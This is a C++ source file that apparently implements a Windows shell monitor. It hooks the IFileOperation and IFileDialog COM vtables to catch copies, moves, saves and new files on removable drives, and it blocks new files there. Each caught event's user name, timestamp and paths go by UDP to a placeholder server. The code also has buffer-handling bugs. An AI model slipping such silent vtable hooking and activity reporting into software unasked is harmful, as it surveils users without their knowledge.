#include "stdafx.h"
#include <shellapi.h>
#include <Shobjidl.h>
#include "VtableHooks.h"
#include "UDPSocket.h"
extern CUDPSocket m_socket;

//com 接口索引
//IFileOperation接口
#define QueryInterface_Index 0
#define AddRef_Index (QueryInterface_Index + 1)
#define Release_Index (AddRef_Index + 1)
#define Advice_Index (Release_Index + 1)
#define Unadvise_Index (Advice_Index + 1)
#define SetOperationFlags_Index (Unadvise_Index + 1)
#define SetProgressMessage_Index (SetOperationFlags_Index + 1)
#define SetProgressDialog_Index (SetProgressMessage_Index + 1)
#define SetProperties_Index (SetProgressDialog_Index + 1)
#define SetOwnerWindow_Index (SetProperties_Index + 1)
#define ApplyPropertiesToItem_Index (SetOwnerWindow_Index + 1)
#define ApplyPropertiesToItems_Index (ApplyPropertiesToItem_Index + 1)
#define RenameItem_Index (ApplyPropertiesToItems_Index + 1)
#define RenameItems_Index (RenameItem_Index + 1)
#define MoveItem_Index (RenameItems_Index + 1)
#define MoveItems_Index (MoveItem_Index + 1)
#define CopyItem_Index (MoveItems_Index + 1)
#define CopyItems_Index (CopyItem_Index + 1)
#define DeleteItem_Index (CopyItems_Index + 1)
#define DeleteItems_Index (DeleteItem_Index + 1)
#define NewItem_Index (DeleteItems_Index + 1)
#define PerformOperations_Index (NewItem_Index + 1)
#define GetAnyOperationAborted_Index (PerformOperations_Index + 1)

//IFileDialog接口
#define Show (Release_Index + 1)
#define SetFileTypes (Show + 1)
#define SetFileTypeIndex (SetFileTypes + 1)
#define GetFileTypeIndex (SetFileTypeIndex + 1)
#define Advise (GetFileTypeIndex + 1)
#define Unadvise (Advise + 1)
#define SetOptions (Unadvise + 1)
#define GetOptions (SetOptions + 1)
#define SetDefaultFolder (GetOptions + 1)
#define SetFolder (SetDefaultFolder + 1)
#define GetFolder (SetFolder + 1)
#define GetCurrentSelection (GetFolder + 1)
#define SetFileName (GetCurrentSelection + 1)
#define GetFileName (SetFileName + 1)
#define SetTitle (GetFileName + 1)
#define SetOkButtonLabel (SetTitle + 1)
#define SetFileNameLabel (SetOkButtonLabel + 1)
#define GetResult (SetFileNameLabel + 1)
#define AddPlace (GetResult + 1)
#define SetDefaultExtension (AddPlace + 1)
#define Close (SetDefaultExtension + 1)
#define SetClientGuid (Close + 1)
#define ClearClientData (SetClientGuid + 1)
#define SetFilter (ClearClientData + 1)

namespace Hook
{
	STDMETHODIMP RpCopyItems(IUnknown* This,  
		    /* [in] */ IUnknown *punkItems,
            /* [in] */ IShellItem *psiDestinationFolder);
	STDMETHODIMP RpMoveItems(IUnknown* This,  
		    /* [in] */ IUnknown *punkItems,
            /* [in] */ IShellItem *psiDestinationFolder);
	STDMETHODIMP RpNewItem(IUnknown* This,  
            /* [in] */ IShellItem *psiDestinationFolder,
            /* [in] */ DWORD dwFileAttributes,
            /* [string][in] */  LPCWSTR pszName,
            /* [string][in] */  LPCWSTR pszTemplateName,
            /* [unique][in] */  IFileOperationProgressSink *pfopsItem);
	STDMETHODIMP RpGetResult(IUnknown* This,
            /* [out] */ IShellItem **ppsi);
}
typedef HRESULT (__stdcall *OgCopyItems)(IUnknown* This,
	        /* [in] */ IUnknown *punkItems,
            /* [in] */ IShellItem *psiDestinationFolder);
typedef HRESULT (__stdcall *OgMoveItems)(IUnknown* This,
	        /* [in] */ IUnknown *punkItems,
            /* [in] */ IShellItem *psiDestinationFolder);
typedef HRESULT (__stdcall *OgNewItem)(IUnknown* This,  
            /* [in] */ IShellItem *psiDestinationFolder,
            /* [in] */ DWORD dwFileAttributes,
            /* [string][in] */  LPCWSTR pszName,
            /* [string][in] */  LPCWSTR pszTemplateName,
            /* [unique][in] */  IFileOperationProgressSink *pfopsItem);
typedef HRESULT (__stdcall *OgGetResult)(IUnknown* This,
            /* [out] */ IShellItem **ppsi);


struct Context
{
	Context(): m_Name("Hooked object")
	{ }

	PVOID m_OriginalCopyItems;
	PVOID m_OriginalMoveItems;
	PVOID m_OriginalNewItem;
	PVOID m_OriginalGetResult;
	ATL::CComBSTR m_Name;
};

//////////////////////////////////////////////////////////////////////////
std::auto_ptr<Context> g_Context(new Context);
//////////////////////////////////////////////////////////////////////////
HRESULT HookMethod(IUnknown* original, PVOID proxyMethod, PVOID* originalMethod, DWORD vtableOffset)
{
	PVOID* originalVtable = *(PVOID**)original;

	if (originalVtable[vtableOffset] == proxyMethod)
		return S_OK;

	*originalMethod = originalVtable[vtableOffset];
	originalVtable[vtableOffset] = proxyMethod;

	return S_OK;
}

HRESULT InstallComInterfaceHooks(IUnknown* originalInterface)
{
	ATL::CComPtr<IFileOperation> so;
	HRESULT hr = originalInterface->QueryInterface(IID_IFileOperation, (void**)&so);
	if (FAILED(hr))
		return hr; // we need this interface to be present

	// remove protection from the vtable
	DWORD dwOld = 0;
	if(!::VirtualProtect(*(PVOID**)(originalInterface), sizeof(LONG_PTR), PAGE_EXECUTE_READWRITE, &dwOld))
		return E_FAIL;

	// hook interface methods 
	HookMethod(so, (PVOID)Hook::RpCopyItems, &g_Context->m_OriginalCopyItems, CopyItems_Index);
	HookMethod(so, (PVOID)Hook::RpMoveItems, &g_Context->m_OriginalMoveItems, MoveItems_Index);
	HookMethod(so, (PVOID)Hook::RpNewItem,   &g_Context->m_OriginalNewItem,   NewItem_Index);
	
	return S_OK;
}

HRESULT InstallComInterfaceHooksExt(IUnknown* originalInterface)
{
	ATL::CComPtr<IFileDialog> fso;	
	HRESULT hr = originalInterface->QueryInterface(IID_IFileDialog, (void**)&fso);
	if (FAILED(hr))
		return hr; // we need this interface to be present

	// remove protection from the vtable
	DWORD dwOld = 0;
	if(!::VirtualProtect(*(PVOID**)(originalInterface), sizeof(LONG_PTR), PAGE_EXECUTE_READWRITE, &dwOld))
		return E_FAIL;
	
	HookMethod(fso, (PVOID)Hook::RpGetResult,  &g_Context->m_OriginalGetResult, GetResult);
	
	return S_OK;
}

//////////////////////////////////////////////////////////////////////////
//////sw====
UINT GetFilesFromDataObjectWin(IUnknown *iUnknown, LPWSTR **ppPath)
{
	int nCount = 0;
	HRESULT hr = E_FAIL;
	LPITEMIDLIST Pv = NULL;
	IShellItemArray* ShellItemArray = NULL;
	do 
	{
		__try
		{
			hr = SHGetIDListFromObject(iUnknown, &Pv);
			if(FAILED(hr))
			{
				WriteLog("SHGetIDListFromObject 失败");
				//break;
		/*		hr = SHGetItemFromObject(iUnknown, IID_IShellItemArray, (void**)&ShellItemArray);
				if ( FAILED(hr) )
				{
					WriteLog("SHGetItemFromObject 失败");
					break;
				}*/
			}
			//else
			//{

				hr = SHCreateShellItemArrayFromIDLists(TRUE, (LPCITEMIDLIST *)&Pv, &ShellItemArray); 
				if(FAILED(hr))
				{
					WriteLog("SHCreateShellItemArrayFromIDLists 失败");
					break;
				}
			//}
			
			hr = ShellItemArray->GetCount((ULONG*)&nCount);
			if(nCount <= 0)
				break;
 
			*ppPath = new LPWSTR[nCount];
			memset(*ppPath, 0, sizeof(LPWSTR)*nCount);		
			for(int Index = 0; Index<nCount; Index++)
			{
				IShellItem* ShellItem = NULL;
 				if(SUCCEEDED(ShellItemArray->GetItemAt(Index, &ShellItem)))
				{
					if(ShellItem /*&& ShellItem->GetAttributes(0x20000000, &GAof ) == 0 */)
					{
						LPWSTR Temp = NULL;
						if(SUCCEEDED(ShellItem->GetDisplayName(SIGDN_FILESYSPATH, &Temp)))
						{
							__try
							{
								if(Temp != NULL)
								{
									int Length = wcslen(Temp);
									*ppPath[Index] = new WCHAR[Length + 1];
									memset(*ppPath[Index], 0, sizeof(WCHAR)*(Length + 1));
									wcsncpy(*ppPath[Index], Temp, Length);
									CoTaskMemFree(Temp);
									Temp = NULL;
								}
							}
							__except(EXCEPTION_EXECUTE_HANDLER)
							{
								if(Temp != NULL)
								{
									CoTaskMemFree(Temp);
									Temp = NULL;
								}
							}
						}
					}
					if(ShellItem)
					{
						ShellItem->Release();
					}					
				}
			}
		}
		__finally
		{
			if(ShellItemArray)
				ShellItemArray->Release();
 
			if(Pv)
				CoTaskMemFree(Pv);
		}
	
	} while(FALSE);
 
	return nCount;
} 

UINT GetFilesFromDataObject(IUnknown *iUnknown, LPWSTR **ppPath)
{
    UINT uFileCount = 0;
    IDataObject *iDataObject = NULL;
    HRESULT hr = iUnknown->QueryInterface(IID_IDataObject, (void **)&iDataObject); 
    do
    {
        if(!SUCCEEDED(hr))
        {
            break;
        }

        FORMATETC fmt = { CF_HDROP, NULL, DVASPECT_CONTENT, -1, TYMED_HGLOBAL };
        STGMEDIUM stg = { TYMED_HGLOBAL };
        if(!SUCCEEDED(iDataObject->GetData(&fmt, &stg)))
        {
            break;
        }

        HDROP hDrop = (HDROP)GlobalLock(stg.hGlobal);
        if(hDrop == NULL)
        {
            break;
        }
        uFileCount = DragQueryFile(hDrop, 0xFFFFFFFF, NULL, 0);
        if(uFileCount <= 0)
        {
            break;
        }

        *ppPath = new LPWSTR[uFileCount];
        if(*ppPath != NULL)
        {
            for(UINT uIndex=0; uIndex<uFileCount; uIndex++)
            {
				(*ppPath)[uIndex] = new WCHAR[MAX_PATH + 1];
				memset((*ppPath)[uIndex], 0, sizeof(WCHAR)*(MAX_PATH + 1));
                DragQueryFile(hDrop, uIndex, (*ppPath)[uIndex], MAX_PATH);
            }
        }
        else
        {
            uFileCount = 0;
        } 

        GlobalUnlock(stg.hGlobal);
        ReleaseStgMedium(&stg);
    }while(FALSE);

    return uFileCount;
} 

BOOL IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;

	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}

//是否需要写Log日志文件的开关，不需要就将他mark掉
#define  WRITELOG
//LOG日志文件的路径
#define  MYDLLLOGPATH  "d:\\ComHook.log"
void WriteLog(const char *fmt,...)
{
	CTime mTimeNew;
	mTimeNew = CTime::GetCurrentTime(); 
	int nYear = mTimeNew.GetYear();
	int nMonth = mTimeNew.GetMonth();
	int nDay = mTimeNew.GetDay();
	int nHour = mTimeNew.GetHour();
	int nMin = mTimeNew.GetMinute();
	int nSec = mTimeNew.GetSecond();

//#ifdef WRITELOG
	va_list args;
	char modname[200];
	char temp[5000]={0};
	HANDLE hFile;
	GetModuleFileNameA(NULL, modname, sizeof(modname));
	if((hFile =CreateFileA(MYDLLLOGPATH, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) <0) return;
	int pos = SetFilePointer(hFile, 0, NULL, FILE_END);
	if (pos != -1) // Test for failure
	{
		wsprintfA(temp, "%d-%02d-%02d %02d:%02d:%02d|%s: ", nYear,nMonth,nDay,nHour,nMin,nSec, modname);
		DWORD dw;
		WriteFile(hFile, temp, strlen(temp), &dw, NULL);
		va_start(args,fmt);
		vsprintf(temp, fmt, args);
		va_end(args);
		WriteFile(hFile, temp, strlen(temp), &dw, NULL);
		wsprintfA(temp, "\r\n");
		WriteFile(hFile, temp, strlen(temp), &dw, NULL);
	}

	CloseHandle(hFile);
//#endif
}

STDMETHODIMP STDMETHODCALLTYPE Hook::RpCopyItems(IUnknown* This, 
	        /* [in] */ IUnknown *punkItems,
            /* [in] */ IShellItem *psiDestinationFolder)
{
	//test need to delete
	WriteLog("================CopyFile Begin===========================");

	//系统原有功能
	OgCopyItems org = (OgCopyItems)g_Context->m_OriginalCopyItems;
	HRESULT hr = org(This, punkItems, psiDestinationFolder); 

	//用户自定义功能
	LPWSTR* lpSrc = NULL;
	LPWSTR lpwDst = NULL;
	char lpDst[MAX_PATH] = {0};

	//目的目录
	hr = psiDestinationFolder->GetDisplayName(SIGDN_FILESYSPATH, &lpwDst); 
	if(SUCCEEDED(hr))
	{
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,
			lpwDst,	-1,	lpDst, sizeof(lpDst), NULL, NULL );

		int nLen = strlen(lpDst);
		if(nLen >= 3)
		{
			char strDriver[3+1] = {0};
			memset(strDriver, 0x00, sizeof(strDriver));
			strncpy(strDriver, lpDst, 3);
			UINT DiskType = GetDriveTypeA(strDriver);
			if(DiskType != DRIVE_REMOVABLE)
			{
				return hr;
			}
		}
	 }
	


	//获取操作系统当前用户
	DWORD dwNameLen = 32;
	char szBuffer[32];
	memset(szBuffer,0x00, sizeof(szBuffer));
	if(!GetUserNameA(szBuffer, &dwNameLen))
	{
		strcpy(szBuffer, "Administrator");
	}


	//获取系统日期和时间
	char szCurrentDateTime[64];
	CTime oNowTime;
	oNowTime = CTime::GetCurrentTime();
	sprintf(szCurrentDateTime, "M-%.2d-%.2d-%.2d:%.2d:%.2d:%.2d",
		    oNowTime.GetYear(), oNowTime.GetMonth(), oNowTime.GetDay(), 
			oNowTime.GetHour(), oNowTime.GetMinute(), oNowTime.GetSecond()); 
	 

	//获取源文件信息
	int nCount = GetFilesFromDataObject(punkItems, &lpSrc);
	for(int i=0; i<nCount; i++)
	{
		char lpItem[MAX_PATH] = {0};
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,	
			lpSrc[i], -1, lpItem, sizeof(lpDst), NULL, NULL );

		char strMsg[1024];
		memset(strMsg, 0x00, sizeof(strMsg));

		DWORD dwAttr = ::GetFileAttributes(lpSrc[i]);
		if(dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY))
			wsprintfA(strMsg, "|%s|%s|文件复制|%s|%s|", 
				szBuffer, szCurrentDateTime, lpItem, lpDst);
		else
			wsprintfA(strMsg, "|%s|%s|目录复制|%s|%s|", 
				szBuffer, szCurrentDateTime, lpItem, lpDst);

		
		//test need to delete
		WriteLog(strMsg);
		//发送到服务器
		char sIP[16];
		memset(sIP, 0, sizeof(sIP));
		sprintf(sIP, "%s", "x.x.x.x");

		int len = 0;
		int datalen = strlen(strMsg)+1;
		len = m_socket.SendTo((char*)&strMsg, datalen , sIP, SVR_NODE_PORT); 
		//发送完成

		if(lpSrc[i] != NULL)
			delete [] lpSrc[i];
	} 

	if(lpSrc != NULL)
	    delete [] lpSrc;


	//test need to delete
	WriteLog("================CopyFile End=============================");

	return hr;
}



STDMETHODIMP STDMETHODCALLTYPE Hook::RpMoveItems(IUnknown* This, 
	        /* [in] */ IUnknown *punkItems,
            /* [in] */ IShellItem *psiDestinationFolder)
{
	//test need to delete
	WriteLog("================MoveFile Begin===========================");

	//系统原有功能
	OgMoveItems org = (OgMoveItems)g_Context->m_OriginalMoveItems;
	HRESULT hr = org(This, punkItems, psiDestinationFolder);

	//用户自定义功能
	LPWSTR* lpSrc = NULL;
	LPWSTR lpwDst = NULL;
	char lpDst[MAX_PATH] = {0};

	//目的目录
	hr = psiDestinationFolder->GetDisplayName(SIGDN_FILESYSPATH, &lpwDst); 
	if(SUCCEEDED(hr))
	{
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,
			lpwDst,	-1,	lpDst, sizeof(lpDst), NULL, NULL );

		int nLen = strlen(lpDst);
		if(nLen >= 3)
		{
			char strDriver[3+1] = {0};
			memset(strDriver, 0x00, sizeof(strDriver));
			strncpy(strDriver, lpDst, 3);
			UINT DiskType = GetDriveTypeA(strDriver);
			if(DiskType != DRIVE_REMOVABLE)
			{
				return hr;
			}
		}
	 }

	//获取操作系统当前用户
	DWORD dwNameLen = 32;
	char szBuffer[32];
	memset(szBuffer,0x00, sizeof(szBuffer));
	if(!GetUserNameA(szBuffer, &dwNameLen))
	{
		strcpy(szBuffer, "Administrator");
	}


	//获取系统日期和时间
	char szCurrentDateTime[64];
	CTime oNowTime;
	oNowTime = CTime::GetCurrentTime();
	sprintf(szCurrentDateTime, "M-%.2d-%.2d-%.2d:%.2d:%.2d:%.2d",
		    oNowTime.GetYear(), oNowTime.GetMonth(), oNowTime.GetDay(), 
			oNowTime.GetHour(), oNowTime.GetMinute(), oNowTime.GetSecond()); 
	 

	//获取源文件信息
	int nCount = GetFilesFromDataObject(punkItems, &lpSrc);
	for(int i=0; i<nCount; i++)
	{
		char lpItem[MAX_PATH] = {0};
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,	
			lpSrc[i], -1, lpItem, sizeof(lpDst), NULL, NULL );

		char strMsg[1024];
		memset(strMsg, 0x00, sizeof(strMsg));
		DWORD dwAttr = ::GetFileAttributes(lpSrc[i]);
		if(dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY))
			wsprintfA(strMsg, "|%s|%s|文件移动|%s|%s|", 
				szBuffer, szCurrentDateTime, lpItem, lpDst);
		else
			wsprintfA(strMsg, "|%s|%s|目录移动|%s|%s|", 
				szBuffer, szCurrentDateTime, lpItem, lpDst);
		
		//test need to delete
		WriteLog(strMsg);

		//发送到服务器
		char sIP[16];
		memset(sIP, 0, sizeof(sIP));
		sprintf(sIP, "%s", "x.x.x.x");

		int len = 0;
		int datalen = strlen(strMsg)+1;
		len = m_socket.SendTo((char*)&strMsg, datalen , sIP, SVR_NODE_PORT); 
		//发送完成


		if(lpSrc[i] != NULL)
			delete [] lpSrc[i];
	} 

	if(lpSrc != NULL)
	    delete [] lpSrc;


	//test need to delete
	WriteLog("================MoveFile End=============================");

	return hr;
}




STDMETHODIMP STDMETHODCALLTYPE Hook::RpNewItem(IUnknown* This,  
            /* [in] */ IShellItem *psiDestinationFolder,
            /* [in] */ DWORD dwFileAttributes,
            /* [string][in] */  LPCWSTR pszName,
            /* [string][in] */  LPCWSTR pszTemplateName,
            /* [unique][in] */  IFileOperationProgressSink *pfopsItem)

{
	//用户自定义功能 
	LPWSTR lpwDst = NULL;
	char lpDst[MAX_PATH] = {0};

	//目的目录
	HRESULT hr = psiDestinationFolder->GetDisplayName(SIGDN_FILESYSPATH, &lpwDst); 
	if(SUCCEEDED(hr))
	{
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,
			lpwDst,	-1,	lpDst, sizeof(lpDst), NULL, NULL );

		int nLen = strlen(lpDst);
		if(nLen >= 3)
		{
			char strDriver[3+1] = {0};
			memset(strDriver, 0x00, sizeof(strDriver));
			strncpy(strDriver, lpDst, 3);
			UINT DiskType = GetDriveTypeA(strDriver);
			if(DiskType != DRIVE_REMOVABLE)
			{
				//系统原有功能
				OgNewItem org = (OgNewItem)g_Context->m_OriginalNewItem;
				hr = org(This, psiDestinationFolder, dwFileAttributes, pszName, pszTemplateName, pfopsItem);
				return hr;
			}
		}
	 }

	
	WriteLog("================禁止新建===========================");
    return hr;


	//test need to delete
	WriteLog("================NewFile Begin===========================");
	


	//系统原有功能
	OgNewItem org = (OgNewItem)g_Context->m_OriginalNewItem;
	hr = org(This, psiDestinationFolder, dwFileAttributes, pszName, pszTemplateName, pfopsItem);

	
	//获取操作系统当前用户
	DWORD dwNameLen = 32;
	char szBuffer[32];
	memset(szBuffer,0x00, sizeof(szBuffer));
	if(!GetUserNameA(szBuffer, &dwNameLen))
	{
		strcpy(szBuffer, "Administrator");
	}


	//获取系统日期和时间
	char szCurrentDateTime[64];
	CTime oNowTime;
	oNowTime = CTime::GetCurrentTime();
	sprintf(szCurrentDateTime, "M-%.2d-%.2d-%.2d:%.2d:%.2d:%.2d",
		    oNowTime.GetYear(), oNowTime.GetMonth(), oNowTime.GetDay(), 
			oNowTime.GetHour(), oNowTime.GetMinute(), oNowTime.GetSecond()); 
	 

	////获取源文件信息
	//int nCount = GetFilesFromDataObject(punkItems, &lpSrc);
	//for(int i=0; i<nCount; i++)
	//{
		char lpItem[MAX_PATH] = {0};
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,	
			pszName, -1, lpItem, sizeof(lpDst), NULL, NULL );

		char strMsg[1024];
		memset(strMsg, 0x00, sizeof(strMsg));
		DWORD dwAttr = dwFileAttributes;
		if(dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY))
			wsprintfA(strMsg, "|%s|%s|新建文件|%s|%s|", 
				szBuffer, szCurrentDateTime, lpItem, lpDst);
		else
			wsprintfA(strMsg, "|%s|%s|新建目录|%s|%s|", 
				szBuffer, szCurrentDateTime, lpItem, lpDst);
		
		//test need to delete
		WriteLog(strMsg);

		//发送到服务器
		char sIP[16];
		memset(sIP, 0, sizeof(sIP));
		sprintf(sIP, "%s", "x.x.x.x");

		int len = 0;
		int datalen = strlen(strMsg)+1;
		len = m_socket.SendTo((char*)&strMsg, datalen , sIP, SVR_NODE_PORT); 
		//发送完成


	//	if(lpSrc[i] != NULL)
	//		delete [] lpSrc[i];
	//} 

	//if(lpSrc != NULL)
	//    delete [] lpSrc;


	//test need to delete
	WriteLog("================MoveFile End=============================");

	return hr;
}


STDMETHODIMP STDMETHODCALLTYPE Hook::RpGetResult(IUnknown* This,  
              /* [out] */ IShellItem **ppsi)
{
	//test need to delete
	WriteLog("================File As Begin===========================");

	//系统原有功能
	OgGetResult org = (OgGetResult)g_Context->m_OriginalGetResult;
	HRESULT hr = org(This, ppsi);

	if(FAILED(hr)) 
		return hr;

	//用户自定义功能
	//1、目的目录
	LPWSTR lpwDst = NULL;
	char lpDst[MAX_PATH] = {0};
	hr = (*ppsi)->GetDisplayName(SIGDN_DESKTOPABSOLUTEPARSING, &lpwDst); 
	if(SUCCEEDED(hr))
	{
		WideCharToMultiByte (CP_ACP, WC_COMPOSITECHECK,
			lpwDst,	-1,	lpDst, sizeof(lpDst), NULL, NULL );

		int nLen = strlen(lpDst);
		if(nLen >= 3)
		{
			char strDriver[3+1] = {0};
			memset(strDriver, 0x00, sizeof(strDriver));
			strncpy(strDriver, lpDst, 3);
			UINT DiskType = GetDriveTypeA(strDriver);
			if(DiskType != DRIVE_REMOVABLE)
			{
				return hr;
			}
		}
	}

	//2、获取操作系统当前用户
	DWORD dwNameLen = 32;
	char szBuffer[32];
	memset(szBuffer,0x00, sizeof(szBuffer));
	if(!GetUserNameA(szBuffer, &dwNameLen))
	{
		strcpy(szBuffer, "Administrator");
	}


	//3、获取系统日期和时间
	char szCurrentDateTime[64];
	CTime oNowTime;
	oNowTime = CTime::GetCurrentTime();
	sprintf(szCurrentDateTime, "M-%.2d-%.2d-%.2d:%.2d:%.2d:%.2d",
		    oNowTime.GetYear(), oNowTime.GetMonth(), oNowTime.GetDay(), 
			oNowTime.GetHour(), oNowTime.GetMinute(), oNowTime.GetSecond()); 
	 
	char strMsg[1024];
	memset(strMsg, 0x00, sizeof(strMsg));
	wsprintfA(strMsg, "|%s|%s|文件保存|%s|%s|", 
		szBuffer, szCurrentDateTime, lpDst, lpDst);

	//4、test need to delete
	WriteLog(strMsg);

	//5、发送到服务器
	char sIP[16];
	memset(sIP, 0, sizeof(sIP));
	sprintf(sIP, "%s", "x.x.x.x");

	int len = 0;
	int datalen = strlen(strMsg)+1;
	len = m_socket.SendTo((char*)&strMsg, datalen , sIP, SVR_NODE_PORT); 
	//发送完成

	WriteLog("================File As Begin===========================");

	return hr;
}